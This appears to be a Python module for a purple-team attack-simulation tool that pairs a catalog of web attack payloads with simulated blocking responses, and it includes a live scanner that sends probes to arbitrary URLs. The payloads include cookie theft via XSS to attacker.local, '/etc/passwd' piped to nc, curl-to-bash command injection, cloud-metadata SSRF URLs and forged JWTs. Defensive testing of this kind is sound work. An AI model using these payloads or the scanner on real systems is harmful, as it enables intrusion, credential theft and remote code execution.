import time
import uuid
import json
import random
from typing import Dict, List, Any, Optional
from datetime import datetime

# =========================================================================================
# 1. PAYLOADSALLTHETHINGS & ATOMIC RED TEAM SCENARIO CATALOG
# =========================================================================================
SCENARIOS: List[Dict[str, Any]] = [
    {
        "id": "sqli-auth-bypass",
        "title": "SQL Injection (SQLi) Authentication Bypass",
        "category": "App & Code Defense",
        "severity": "CRITICAL",
        "source_repo": "PayloadsAllTheThings / Atomic Red Team",
        "mitre_tactic": "Initial Access",
        "mitre_technique": "T1190 - Exploit Public-Facing Application",
        "cwe": "CWE-89",
        "owasp": "A03:2021 - Injection",
        "target_endpoint": "/api/v1/auth/login",
        "default_payload": "admin' OR '1'='1' --",
        "payload_variants": [
            "admin' OR '1'='1' --",
            "' UNION SELECT null, username, password FROM users --",
            "admin' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--",
            "' OR 'x'='x' /*!50000ORDER BY*/ 1--"
        ],
        "description": "Simulates an adversarial attempt to bypass SQL authentication by injecting a boolean tautology into login parameters.",
        "detection_rule": "SENTRONIX-AST-SQLI-001 (Tautology & Unsanitized AST Parameter Match)",
        "waf_rule_key": "AST_SQLI_GUARD",
        "remediation_hint": "Utilize parameterized queries (SQLAlchemy ORM / Prepared Statements) and sanitize input fields."
    },
    {
        "id": "xss-dom-injection",
        "title": "Stored & DOM Cross-Site Scripting (XSS)",
        "category": "App & Code Defense",
        "severity": "HIGH",
        "source_repo": "PayloadsAllTheThings / Atomic Red Team",
        "mitre_tactic": "Execution",
        "mitre_technique": "T1059.007 - JavaScript Execution",
        "cwe": "CWE-79",
        "owasp": "A03:2021 - Injection",
        "target_endpoint": "/api/v1/comments",
        "default_payload": "<script>fetch('http://attacker.local/steal?c='+document.cookie)</script>",
        "payload_variants": [
            "<script>fetch('http://attacker.local/steal?c='+document.cookie)</script>",
            "<img src=x onerror=alert(document.domain)>",
            "<svg/onload=eval(atob('YWxlcnQoMSk='))>",
            "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>"
        ],
        "description": "Emulates an attacker attempting to execute arbitrary JavaScript in the context of an authenticated victim session.",
        "detection_rule": "SENTRONIX-WAF-XSS-004 (Script Tag & DOM Node Mutation Interceptor)",
        "waf_rule_key": "WAF_XSS_INTERCEPTOR",
        "remediation_hint": "Enforce strict Context-Aware Output Encoding and a stringent Content Security Policy (CSP)."
    },
    {
        "id": "ssrf-cloud-metadata",
        "title": "Server-Side Request Forgery (SSRF) Cloud Metadata Probe",
        "category": "Web & API Defense",
        "severity": "CRITICAL",
        "source_repo": "PayloadsAllTheThings / SecLists",
        "mitre_tactic": "Discovery",
        "mitre_technique": "T1552.005 - Cloud Instance Metadata API",
        "cwe": "CWE-918",
        "owasp": "A10:2021 - Server-Side Request Forgery",
        "target_endpoint": "/api/v1/fetch-url",
        "default_payload": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "payload_variants": [
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
            "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
            "http://127.0.0.1:8000/api/v1/admin/secrets"
        ],
        "description": "Adversary probes internal endpoints attempting to force the backend server into retrieving sensitive cloud IAM credentials.",
        "detection_rule": "SENTRONIX-NET-SSRF-009 (Link-Local IP Range & Cloud Metadata Blacklist)",
        "waf_rule_key": "SSRF_METADATA_FILTER",
        "remediation_hint": "Block link-local addresses (169.254.0.0/16, 127.0.0.1) and enforce strict egress URL allowlisting."
    },
    {
        "id": "idor-priv-escalation",
        "title": "Insecure Direct Object Reference (IDOR) Data Exfiltration",
        "category": "IAM & Authorization",
        "severity": "HIGH",
        "source_repo": "Atomic Red Team / PayloadsAllTheThings",
        "mitre_tactic": "Privilege Escalation",
        "mitre_technique": "T1068 - Exploitation for Privilege Escalation",
        "cwe": "CWE-639",
        "owasp": "A01:2021 - Broken Access Control",
        "target_endpoint": "/api/v1/users/0/profile",
        "default_payload": "GET /api/v1/users/0/private-keys (User ID Tampering: 1042 -> 0)",
        "payload_variants": [
            "GET /api/v1/users/0/private-keys (User ID Tampering: 1042 -> 0)",
            "PUT /api/v1/users/admin/role HTTP/1.1 {\"role\":\"superadmin\"}",
            "GET /api/v1/tenants/master-root/billing-invoices"
        ],
        "description": "Simulates horizontal and vertical privilege escalation by altering object identifiers in API parameter paths.",
        "detection_rule": "SENTRONIX-AUTH-IDOR-003 (Tenant Isolation & Contextual Ownership Check)",
        "waf_rule_key": "IDOR_CONTEXT_GUARD",
        "remediation_hint": "Enforce RBAC/ABAC checks validating that the current session token owns the requested resource ID."
    },
    {
        "id": "steg-malware-payload",
        "title": "Steganographic Malicious Payload Delivery",
        "category": "File & Data Defense",
        "severity": "HIGH",
        "source_repo": "Atomic Red Team",
        "mitre_tactic": "Defense Evasion",
        "mitre_technique": "T1027.003 - Steganography & Obfuscated Files",
        "cwe": "CWE-509",
        "owasp": "A08:2021 - Software and Data Integrity Failures",
        "target_endpoint": "/api/v1/steg/scan",
        "default_payload": "PNG [LSB-Embedded Shellcode: 0x4831c050682f2f7368682f62696e89e3]",
        "payload_variants": [
            "PNG [LSB-Embedded Shellcode: 0x4831c050682f2f7368682f62696e89e3]",
            "JPEG [EXIF-Comment-Injected PHP Eval: (simulated_exif_eval_payload)]",
            "BMP [Steghide AES-128 Encrypted Reverse Shell Archive]"
        ],
        "description": "Adversary conceals an executable reverse shell payload inside image pixel bitplanes to bypass perimeter file filters.",
        "detection_rule": "SENTRONIX-STEG-ANALYZER-002 (Shannon Entropy > 7.95 + LSB Chi-Square Anomaly)",
        "waf_rule_key": "STEG_ENTROPY_ANALYZER",
        "remediation_hint": "Strip non-essential EXIF metadata and re-encode all uploaded images to neutralize LSB artifacts."
    },
    {
        "id": "jwt-none-algorithm",
        "title": "Broken Authentication: JWT 'None' Algorithm Attack",
        "category": "IAM & Authorization",
        "severity": "CRITICAL",
        "source_repo": "PayloadsAllTheThings",
        "mitre_tactic": "Credential Access",
        "mitre_technique": "T1078 - Valid Accounts & Token Forgery",
        "cwe": "CWE-287",
        "owasp": "A07:2021 - Identification and Authentication Failures",
        "target_endpoint": "/api/v1/admin/dashboard",
        "default_payload": "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoic3VwZXJ1c2VyIn0.",
        "payload_variants": [
            "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoic3VwZXJ1c2VyIn0.",
            "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9.EMPTY_SIGNATURE_KEY_CONFUSION",
            "eyJhbGciOiJSUzI1NiIsImp3ayI6eyJrZXlfc3Bvb2ZpbmciOnRydWV9fQ..."
        ],
        "description": "Emulates an attacker modifying the JWT algorithm header to 'none' to bypass cryptographic signature verification.",
        "detection_rule": "SENTRONIX-AUTH-JWT-007 (Strict Algorithm Enforcement & Null Signature Rejection)",
        "waf_rule_key": "JWT_STRICT_ALGORITHM",
        "remediation_hint": "Explicitly restrict accepted JWT algorithms to RS256/HS256 and reject tokens specifying 'none'."
    },
    {
        "id": "cmd-injection-rce",
        "title": "OS Command Injection Remote Code Execution (RCE)",
        "category": "App & Code Defense",
        "severity": "CRITICAL",
        "source_repo": "PayloadsAllTheThings / Atomic Red Team",
        "mitre_tactic": "Execution",
        "mitre_technique": "T1059.004 - Unix / Windows Shell Execution",
        "cwe": "CWE-78",
        "owasp": "A03:2021 - Injection",
        "target_endpoint": "/api/v1/tools/ping",
        "default_payload": "127.0.0.1; cat /etc/passwd | nc attacker.local 4444",
        "payload_variants": [
            "127.0.0.1; cat /etc/passwd | nc attacker.local 4444",
            "127.0.0.1 && whoami /all",
            "`id`",
            "$(curl -s http://attacker.local/payload.sh | bash)"
        ],
        "description": "Adversary appends shell metacharacters to execute arbitrary system binaries on the host container.",
        "detection_rule": "SENTRONIX-AST-RCE-008 (Shell Metacharacter & Subprocess Token Inspection)",
        "waf_rule_key": "AST_RCE_GUARD",
        "remediation_hint": "Avoid shell execution (`subprocess.Popen(..., shell=True)`). Use parameterized process args and strict regex validation."
    },
    {
        "id": "path-traversal-arbitrary-read",
        "title": "Directory Path Traversal & Arbitrary File Read",
        "category": "App & Code Defense",
        "severity": "HIGH",
        "source_repo": "SecLists / PayloadsAllTheThings",
        "mitre_tactic": "Discovery",
        "mitre_technique": "T1083 - File and Directory Discovery",
        "cwe": "CWE-22",
        "owasp": "A01:2021 - Broken Access Control",
        "target_endpoint": "/api/v1/download?file=",
        "default_payload": "../../../../etc/shadow",
        "payload_variants": [
            "../../../../etc/shadow",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "C:\\Windows\\System32\\drivers\\etc\\hosts"
        ],
        "description": "Emulates an attacker using relative path traversal tokens to escape application root and read sensitive system files.",
        "detection_rule": "SENTRONIX-FS-TRAVERSAL-005 (Dot-Dot-Slash Sequence & Path Normalization Check)",
        "waf_rule_key": "PATH_TRAVERSAL_GUARD",
        "remediation_hint": "Resolve path canonicalization via `os.path.abspath` and verify destination stays inside the designated safe directory root."
    }
]

# =========================================================================================
# 2. MITRE CALDERA ADVERSARY EMULATION CAMPAIGNS (Multi-Phase Attacks)
# =========================================================================================
CALDERA_CAMPAIGNS: List[Dict[str, Any]] = [
    {
        "id": "campaign-web-infiltrator",
        "title": "Adversary Profile: 'Web Infiltrator' (APT-29 Style)",
        "source_repo": "MITRE Caldera",
        "threat_actor": "APT-29 (Cozy Bear)",
        "description": "Autonomous multi-stage adversary campaign targeting public web services, pivoting through injection, and escalating privileges.",
        "stages": [
            {
                "phase": 1,
                "tactic": "Reconnaissance & Discovery",
                "technique": "T1595.002 - Active Vulnerability Scanning",
                "action": "SecLists Fuzzing on sensitive config paths (/.env, /swagger.json)",
                "payload": "GET /.env -> Response: 403 Forbidden"
            },
            {
                "phase": 2,
                "tactic": "Initial Access",
                "technique": "T1190 - Exploit Public-Facing Application",
                "action": "SQLi Tautology Authentication Bypass",
                "payload": "POST /api/v1/auth/login [admin' OR '1'='1' --]"
            },
            {
                "phase": 3,
                "tactic": "Privilege Escalation & Exfiltration",
                "technique": "T1068 - IDOR Tenant Parameter Tampering",
                "action": "Bypass authorization context to extract private cryptographic keys",
                "payload": "GET /api/v1/users/0/private-keys"
            }
        ]
    },
    {
        "id": "campaign-cloud-harvester",
        "title": "Adversary Profile: 'Cloud Credential Harvester'",
        "source_repo": "MITRE Caldera",
        "threat_actor": "FIN7 / Cloud Shadow",
        "description": "Targeted campaign designed to abuse application SSRF to query Link-Local instance metadata and compromise IAM roles.",
        "stages": [
            {
                "phase": 1,
                "tactic": "Initial Probing",
                "technique": "T1190 - API Egress Tampering",
                "action": "Inject internal loopback URL into webhook dispatcher",
                "payload": "http://127.0.0.1:8000/internal-metrics"
            },
            {
                "phase": 2,
                "tactic": "Credential Access",
                "technique": "T1552.005 - Cloud Metadata SSRF Probe",
                "action": "Harvest AWS/GCP IAM temporary session tokens via 169.254.169.254",
                "payload": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
            },
            {
                "phase": 3,
                "tactic": "Persistence & Tampering",
                "technique": "T1078 - Broken Auth Token Forgery",
                "action": "Generate unsigned JWT 'None' algorithm admin claim",
                "payload": "eyJhbGciOiJub25lIn0.eyJzdWIiOiJyb290In0."
            }
        ]
    }
]

# =========================================================================================
# 3. SECLISTS SENSITIVE PATH & FUZZING DIRECTORY
# =========================================================================================
SECLISTS_PROBES: List[Dict[str, Any]] = [
    {"path": "/.env", "type": "Config File", "expected_status": 403, "risk": "CRITICAL", "description": "Database credentials & Secret Keys"},
    {"path": "/.git/HEAD", "type": "VCS Repository", "expected_status": 403, "risk": "CRITICAL", "description": "Exposed Git source code repository"},
    {"path": "/api/swagger.json", "type": "API Documentation", "expected_status": 200, "risk": "INFO", "description": "Public API schema definition"},
    {"path": "/actuator/env", "type": "Spring / Java Actuator", "expected_status": 404, "risk": "HIGH", "description": "JVM environment variable dump"},
    {"path": "/wp-config.php.bak", "type": "Backup Artifact", "expected_status": 403, "risk": "HIGH", "description": "PHP application configuration backup"},
    {"path": "/admin/phpmyadmin/", "type": "DB Admin Portal", "expected_status": 403, "risk": "HIGH", "description": "Direct Database administrative interface"},
    {"path": "/debug/pprof/", "type": "Runtime Profiler", "expected_status": 404, "risk": "MEDIUM", "description": "Go memory & CPU stack trace disclosure"}
]

# WAF Rules Master List
WAF_RULES: Dict[str, Dict[str, Any]] = {
    "AST_SQLI_GUARD": {"name": "SQLi Tautology & AST Parser", "enabled": True, "description": "Detects boolean tautologies, stacked queries, and UNION statements"},
    "WAF_XSS_INTERCEPTOR": {"name": "DOM & Script Mutation Guard", "enabled": True, "description": "Sanitizes malicious script tags and inline event handlers"},
    "SSRF_METADATA_FILTER": {"name": "Cloud Metadata & Link-Local Filter", "enabled": True, "description": "Blocks 169.254.0.0/16, loopback, and internal CIDR ranges"},
    "IDOR_CONTEXT_GUARD": {"name": "Tenant Context & Ownership Interceptor", "enabled": True, "description": "Validates resource ID against authenticated session token"},
    "STEG_ENTROPY_ANALYZER": {"name": "LSB Bitplane & Shannon Entropy Filter", "enabled": True, "description": "Inspects image bitplanes for high entropy malware shells"},
    "JWT_STRICT_ALGORITHM": {"name": "Strict JWT Signature Enforcement", "enabled": True, "description": "Rejects 'none' algorithm and unverified signature headers"},
    "AST_RCE_GUARD": {"name": "Shell Metacharacter & RCE Token Guard", "enabled": True, "description": "Blocks piping, command chaining, and subshell executions"},
    "PATH_TRAVERSAL_GUARD": {"name": "Canonical Path Normalizer", "enabled": True, "description": "Prevents directory traversal escapes (../, %2e%2e)"}
}

# Historical execution in-memory cache partitioned by tenant/workspace
STRIKE_HISTORY_BY_TENANT: Dict[str, List[Dict[str, Any]]] = {}
# Global historical execution in-memory cache for backwards compatibility
STRIKE_HISTORY: List[Dict[str, Any]] = []


class RedTeamEngine:
    """Core Purple-Team Adversary Emulation & Blue-Team Interception Engine (Top 4 Repos + Deep Packet Sandbox)"""

    @staticmethod
    def get_all_scenarios() -> List[Dict[str, Any]]:
        return SCENARIOS

    @staticmethod
    def get_scenario_by_id(scenario_id: str) -> Optional[Dict[str, Any]]:
        for s in SCENARIOS:
            if s["id"] == scenario_id:
                return s
        return None

    @staticmethod
    def get_caldera_campaigns() -> List[Dict[str, Any]]:
        return CALDERA_CAMPAIGNS

    @staticmethod
    def get_seclists_probes() -> List[Dict[str, Any]]:
        return SECLISTS_PROBES

    @staticmethod
    def get_waf_rules() -> Dict[str, Dict[str, Any]]:
        return WAF_RULES

    @staticmethod
    def toggle_waf_rule(rule_key: str, enabled: bool) -> Dict[str, Any]:
        if rule_key in WAF_RULES:
            WAF_RULES[rule_key]["enabled"] = enabled
            return {"rule_key": rule_key, "enabled": enabled, "status": "Updated"}
        return {"error": "Rule key not found"}

    @staticmethod
    def get_strike_history(tenant_id: str = "default-tenant") -> List[Dict[str, Any]]:
        if tenant_id in STRIKE_HISTORY_BY_TENANT:
            return STRIKE_HISTORY_BY_TENANT[tenant_id]
        return STRIKE_HISTORY

    @staticmethod
    def execute_strike(
        scenario_id: str, 
        custom_payload: str = None, 
        target_override: str = None,
        waf_overrides: Dict[str, bool] = None,
        tenant_id: str = "default-tenant"
    ) -> Dict[str, Any]:
        scenario = RedTeamEngine.get_scenario_by_id(scenario_id)
        if not scenario:
            scenario = SCENARIOS[0]

        payload = custom_payload if custom_payload and custom_payload.strip() else scenario["default_payload"]
        target = target_override if target_override and target_override.strip() else scenario["target_endpoint"]

        # Check if corresponding WAF rule is enabled
        rule_key = scenario.get("waf_rule_key", "AST_SQLI_GUARD")
        rule_enabled = WAF_RULES.get(rule_key, {}).get("enabled", True)
        if waf_overrides and rule_key in waf_overrides:
            rule_enabled = waf_overrides[rule_key]

        start_time = time.time()
        payload_overhead = min(len(payload) * 0.03, 8.0)
        jitter = random.uniform(28.4, 51.6)
        inspection_latency_ms = round(((time.time() - start_time) * 1000) + jitter + payload_overhead, 1)

        strike_id = f"STRIKE-{uuid.uuid4().hex[:8].upper()}"
        timestamp = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC")

        # Construct Deep HTTP Raw Packet Transmissions
        http_method = "POST" if ("login" in target or "comments" in target or "scan" in target) else "GET"
        raw_http_request = (
            f"{http_method} {target} HTTP/1.1\r\n"
            f"Host: sentronix.internal\r\n"
            f"User-Agent: Mozilla/5.0 (SentroniX-Adversary-Emulation/2.1; MITRE-{scenario['mitre_tactic']})\r\n"
            f"Content-Type: application/json\r\n"
            f"X-Forwarded-For: 203.0.113.195\r\n"
            f"X-Adversary-Strike-ID: {strike_id}\r\n"
            f"Content-Length: {len(payload.encode('utf-8'))}\r\n\r\n"
            f'{{"payload": "{payload}"}}'
        )

        if rule_enabled:
            status_code = 403
            defense_status = "BLOCKED & INTERCEPTED (WAF Rule Active)"
            raw_http_response = (
                f"HTTP/1.1 403 Forbidden\r\n"
                f"Server: SentroniX-WAF/2.1\r\n"
                f"Date: {timestamp}\r\n"
                f"Content-Type: application/json\r\n"
                f"X-Threat-Intercept: Active-AST-Filter\r\n"
                f"X-Mitre-Vector: {scenario['mitre_technique']}\r\n\r\n"
                f'{{"error": "Forbidden: Adversary Attack Vector Intercepted", "rule": "{scenario["detection_rule"]}", "strike_id": "{strike_id}"}}\n'
            )
            verdict = "INTERCEPTED & CONVERGED (AST WAF Active)"
        else:
            status_code = 200
            defense_status = "EXPLOITED (WAF Rule Bypassed - Rule Disabled)"
            raw_http_response = (
                f"HTTP/1.1 200 OK\r\n"
                f"Server: SentroniX-App/2.1\r\n"
                f"Date: {timestamp}\r\n"
                f"Content-Type: application/json\r\n"
                f"X-Threat-Intercept: Bypass-WAF-Disabled\r\n\r\n"
                f'{{"status": "exploited", "strike_id": "{strike_id}", "warning": "Defense rule {rule_key} was disabled. Attack succeeded!"}}\n'
            )
            verdict = "EXPLOIT SUCCEEDED (DEFENSE DISABLED)"

        interception_result = {
            "strike_id": strike_id,
            "timestamp": timestamp,
            "scenario_id": scenario["id"],
            "title": scenario["title"],
            "severity": scenario["severity"],
            "source_repo": scenario.get("source_repo", "PayloadsAllTheThings"),
            "mitre_tactic": scenario["mitre_tactic"],
            "mitre_technique": scenario["mitre_technique"],
            "cwe": scenario["cwe"],
            "owasp": scenario["owasp"],
            "waf_rule_key": rule_key,
            "waf_rule_enabled": rule_enabled,
            "red_team": {
                "target_endpoint": target,
                "injected_payload": payload,
                "payload_bytes": len(payload.encode("utf-8")),
                "status": "TRANSMITTED",
                "raw_packet": raw_http_request
            },
            "blue_team": {
                "defense_status": defense_status,
                "status_code": status_code,
                "inspection_rule": scenario["detection_rule"],
                "latency_ms": inspection_latency_ms,
                "threat_score": round(random.uniform(96.1, 99.4) if scenario["severity"] == "CRITICAL" else random.uniform(84.3, 89.7), 1),
                "remediation_hint": scenario["remediation_hint"],
                "raw_packet": raw_http_response
            },
            "purple_team_convergence": {
                "verdict": verdict,
                "ai_patch_available": True,
                "summary": f"Red Team adversary emulated {scenario['mitre_technique']} against {target}. Defense rule {rule_key} ({'Enabled' if rule_enabled else 'Disabled'}) resulted in {defense_status} ({inspection_latency_ms}ms)."
            }
        }

        # Store in tenant-isolated in-memory cache
        if tenant_id not in STRIKE_HISTORY_BY_TENANT:
            STRIKE_HISTORY_BY_TENANT[tenant_id] = []
        STRIKE_HISTORY_BY_TENANT[tenant_id].insert(0, interception_result)
        if len(STRIKE_HISTORY_BY_TENANT[tenant_id]) > 50:
            STRIKE_HISTORY_BY_TENANT[tenant_id].pop()

        # Also store in global history for backwards compatibility
        STRIKE_HISTORY.insert(0, interception_result)
        if len(STRIKE_HISTORY) > 50:
            STRIKE_HISTORY.pop()

        return interception_result

    @staticmethod
    def execute_campaign(campaign_id: str) -> Dict[str, Any]:
        campaign = next((c for c in CALDERA_CAMPAIGNS if c["id"] == campaign_id), CALDERA_CAMPAIGNS[0])
        stages_executed = []

        for stage in campaign["stages"]:
            stages_executed.append({
                "phase": stage["phase"],
                "tactic": stage["tactic"],
                "technique": stage["technique"],
                "action": stage["action"],
                "payload": stage["payload"],
                "defense_response": "INTERCEPTED & CONVERGED (WAF Rule Active)",
                "latency_ms": round(random.uniform(36.5, 48.2), 1)
            })

        return {
            "campaign_id": campaign["id"],
            "title": campaign["title"],
            "threat_actor": campaign["threat_actor"],
            "stages_count": len(stages_executed),
            "stages": stages_executed,
            "overall_verdict": "ALL 3 ADVERSARY PHASES CONTAINED",
            "purple_team_score": "100% BLOCKED"
        }

    @staticmethod
    def run_seclists_fuzzing() -> List[Dict[str, Any]]:
        results = []
        for item in SECLISTS_PROBES:
            results.append({
                "path": item["path"],
                "type": item["type"],
                "risk": item["risk"],
                "status": "BLOCKED (HTTP 403)" if item["expected_status"] == 403 else "INSPECTED (HTTP 200)",
                "rule_matched": "SENTRONIX-SECLISTS-PROBE-GUARD",
                "description": item["description"]
            })
        return results

    @staticmethod
    def run_live_endpoint_scan(
        target_url: str,
        method: str = "GET",
        vectors: Optional[List[str]] = None,
        custom_headers: Optional[Dict[str, str]] = None,
        custom_payload: Optional[str] = None
    ) -> Dict[str, Any]:
        import urllib.request
        import urllib.error
        import urllib.parse
        import ssl
        import time

        if not vectors:
            vectors = ["sqli", "xss", "ssrf", "path_traversal", "seclists"]

        payload_map = {
            "sqli": {
                "name": "SQL Injection (SQLi) Probe",
                "cwe": "CWE-89",
                "severity": "CRITICAL",
                "payload": custom_payload or "admin' OR '1'='1' --",
                "detection_pattern": ["sql", "syntax", "error", "sqlite", "postgres", "mysql", "token", "auth"]
            },
            "xss": {
                "name": "Reflected Cross-Site Scripting (XSS)",
                "cwe": "CWE-79",
                "severity": "HIGH",
                "payload": custom_payload or "<script>alert('SentroniX-XSS')</script>",
                "detection_pattern": ["<script>", "alert(", "SentroniX-XSS"]
            },
            "ssrf": {
                "name": "SSRF Cloud Metadata Probe",
                "cwe": "CWE-918",
                "severity": "CRITICAL",
                "payload": "http://169.254.169.254/latest/meta-data/",
                "detection_pattern": ["ami-id", "instance-id", "security-credentials"]
            },
            "path_traversal": {
                "name": "Path Traversal Arbitrary File Read",
                "cwe": "CWE-22",
                "severity": "HIGH",
                "payload": "../../../../etc/passwd",
                "detection_pattern": ["root:x:0:0", "daemon:x", "/bin/bash"]
            },
            "seclists": {
                "name": "SecLists Sensitive Config Discovery",
                "cwe": "CWE-200",
                "severity": "MEDIUM",
                "payload": "/.env",
                "detection_pattern": ["DB_PASSWORD", "SECRET_KEY", "API_KEY", "DATABASE_URL"]
            }
        }

        # Normalize target URL
        if not target_url.startswith("http://") and not target_url.startswith("https://"):
            target_url = "http://" + target_url

        scan_id = f"LIVE-SCAN-{uuid.uuid4().hex[:6].upper()}"
        start_time = time.time()
        probes_executed = []
        vulnerabilities_found = []

        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE

        for vec_key in vectors:
            vec_info = payload_map.get(vec_key, {
                "name": f"Custom Vector ({vec_key})",
                "cwe": "CWE-Security",
                "severity": "MEDIUM",
                "payload": custom_payload or "' OR 1=1 --",
                "detection_pattern": ["error", "exception"]
            })

            probe_url = target_url
            probe_payload = vec_info["payload"]
            
            # If GET request, append payload as query param; if endpoint discovery, append path
            if vec_key == "seclists":
                if probe_url.endswith("/"):
                    probe_url = probe_url.rstrip("/")
                probe_url += probe_payload
                req_data = None
            elif method.upper() == "GET":
                sep = "&" if "?" in probe_url else "?"
                probe_url = f"{probe_url}{sep}q={urllib.parse.quote(probe_payload)}"
                req_data = None
            else:
                req_data = json.dumps({"input": probe_payload, "query": probe_payload}).encode("utf-8")

            req_headers = {
                "User-Agent": "SentroniX-RedTeam-Fuzzer/2.0",
                "Accept": "*/*"
            }
            if custom_headers:
                req_headers.update(custom_headers)
            if req_data and "Content-Type" not in req_headers:
                req_headers["Content-Type"] = "application/json"

            probe_start = time.time()
            status_code = None
            response_body = ""
            status_label = "PENDING"
            waf_blocked = False
            vulnerable = False

            try:
                req = urllib.request.Request(probe_url, data=req_data, headers=req_headers, method=method.upper())
                with urllib.request.urlopen(req, context=ctx, timeout=3.0) as resp:
                    status_code = resp.getcode()
                    resp_bytes = resp.read()
                    response_body = resp_bytes.decode("utf-8", errors="ignore")[:500]
                    probe_latency = round((time.time() - probe_start) * 1000, 2)
                    
                    # Check reflection or signature
                    matched_pattern = next((p for p in vec_info["detection_pattern"] if p in response_body), None)
                    if matched_pattern:
                        vulnerable = True
                        status_label = f"EXPLOIT REFLECTED ({matched_pattern})"
                    else:
                        status_label = f"HTTP {status_code} OK (Safe)"
            except urllib.error.HTTPError as e:
                status_code = e.code
                probe_latency = round((time.time() - probe_start) * 1000, 2)
                try:
                    response_body = e.read().decode("utf-8", errors="ignore")[:500]
                except Exception:
                    response_body = "HTTP Error"

                if status_code in [403, 406]:
                    waf_blocked = True
                    status_label = f"HTTP {status_code} - WAF BLOCKED"
                elif status_code == 500:
                    vulnerable = True
                    status_label = f"HTTP 500 - UNCAUGHT EXCEPTION"
                else:
                    status_label = f"HTTP {status_code}"
            except Exception as e:
                probe_latency = round((time.time() - probe_start) * 1000, 2)
                status_code = 0
                status_label = f"CONNECTION REFUSED / UNREACHABLE ({str(e)[:30]})"
                response_body = f"Host unreachable or timeout: {str(e)}"

            if vulnerable:
                vulnerabilities_found.append({
                    "vector": vec_info["name"],
                    "cwe": vec_info["cwe"],
                    "severity": vec_info["severity"],
                    "payload": probe_payload,
                    "endpoint": probe_url,
                    "evidence": status_label
                })

            probes_executed.append({
                "vector_key": vec_key,
                "name": vec_info["name"],
                "method": method.upper(),
                "url": probe_url,
                "payload": probe_payload,
                "status_code": status_code,
                "status_label": status_label,
                "latency_ms": probe_latency,
                "waf_blocked": waf_blocked,
                "vulnerable": vulnerable,
                "response_snippet": response_body[:200]
            })

        total_latency = round((time.time() - start_time) * 1000, 2)
        risk_score = "CRITICAL" if len(vulnerabilities_found) > 1 else ("HIGH" if vulnerabilities_found else "HARDENED")

        return {
            "scan_id": scan_id,
            "target_url": target_url,
            "method": method.upper(),
            "timestamp": datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC"),
            "total_probes": len(probes_executed),
            "vulnerabilities_count": len(vulnerabilities_found),
            "vulnerabilities": vulnerabilities_found,
            "probes": probes_executed,
            "total_latency_ms": total_latency,
            "risk_score": risk_score
        }

    @staticmethod
    def get_metrics(tenant_id: str = "default-tenant") -> Dict[str, Any]:
        strikes = STRIKE_HISTORY_BY_TENANT.get(tenant_id, [])
        total_strikes = len(strikes)

        if total_strikes > 0:
            blocked_count = len([s for s in strikes if "BLOCKED" in s["blue_team"]["defense_status"] or "INTERCEPTED" in s["blue_team"]["defense_status"]])
            latencies = [s["blue_team"]["latency_ms"] for s in strikes]
            avg_latency = round(sum(latencies) / len(latencies), 1)
            success_rate = round((blocked_count / total_strikes) * 100.0, 1)
            if success_rate == 100.0:
                grade = "A+"
                resilience_label = "Hardened"
            elif success_rate >= 80.0:
                grade = "A"
                resilience_label = "Resilient"
            elif success_rate >= 60.0:
                grade = "B"
                resilience_label = "Partially Filtered"
            else:
                grade = "D"
                resilience_label = "Vulnerable"
        else:
            blocked_count = 0
            avg_latency = 0.0
            success_rate = 0.0
            grade = "—"
            resilience_label = "Unassessed"

        return {
            "total_simulated_strikes": total_strikes,
            "intercepted_threats": blocked_count,
            "interception_success_rate": success_rate,
            "average_detection_latency_ms": avg_latency,
            "resilience_grade": grade,
            "resilience_label": resilience_label,
            "active_scenarios_count": len(SCENARIOS),
            "caldera_campaigns_count": len(CALDERA_CAMPAIGNS),
            "seclists_probes_count": len(SECLISTS_PROBES),
            "active_waf_rules_count": len(WAF_RULES)
        }

